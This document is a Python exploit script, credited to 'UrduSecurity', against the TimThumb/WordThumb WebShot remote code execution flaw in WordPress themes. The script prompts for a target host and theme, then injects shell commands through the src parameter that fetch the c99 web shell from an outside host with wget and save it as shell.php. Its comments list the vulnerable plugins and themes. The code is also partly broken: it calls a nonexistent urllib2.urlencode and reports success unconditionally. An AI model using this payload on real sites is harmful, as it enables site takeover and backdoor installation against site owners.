#!/usr/bin/env python

# TimThumb is a small php script for cropping, zooming and resizing web
# images (jpg, png, gif). Perfect for use on blogs and other applications.
# Developed for use in the WordPress theme Mimbo Pro, and since used in many
# other WordPress themes.

# http://www.binarymoon.co.uk/projects/timthumb/
# https://code.google.com/p/timthumb/

# The original project WordThumb 1.07 also vulnerable (
# https://code.google.com/p/wordthumb/)
#They both shared exactly the same WebShot code! And there are several
# projects that shipped with "timthumb.php", such as,@u0x (Pichaya Morimoto)
# Wordpress Gallery Plugin
# https://wordpress.org/plugins/wordpress-gallery-plugin/
# IGIT Posts Slider Widget
# http://wordpress.org/plugins/igit-posts-slider-widget/

# All themes from http://themify.me/ contains vulnerable "wordthumb" in
# "<theme-name>/themify/img.php".''' 

# [+] Exploit
# ============================================================
# http://<wp-website>/wp-content/themes/<wp-theme>/path/to/timthumb.php?webshot=1&src=http://<wp-website>$(<os-cmds>)

import os,sys,urllib2

os.system('clear')

def banner():
	print '''
	-- UrduSecurity Exploits --
	--  TimThumb 2.8.13 Remote Code Execution --
	-- Author: Muhammad Adeel --
	-- blog: http://urduSecurity.blogspot.com\n\n'''
	
def usage():
	print '''
	-- Usage: python UrduSecurity-Exploit.py --\n'''

banner()
usage()
host = raw_input('Enter Target Host[anything.com]: ')
theme = raw_input('Theme Name[parallax or any which you find]: ')

def getShell():
	prepayload = urllib2.urlencode('http://'+host+'/wp-content/themes/'+theme+'/themify/img.php?webshot=1&src=http://'+host+'/$(wget http://www.c99php.com/shell/c99.txt; mv c99.txt shell.php)')
	payload = urllib2.urlopen(prepayload)
	print '\n'
	while True:
		try:
			print "[+] Shell Uploaded! Find Your Shell in Theme Directory."
			banner()
			sys.exit()
		except:
			pass
getShell()

def main():
	banner()
	usage()
	if __name__ == '__main__':
		main()
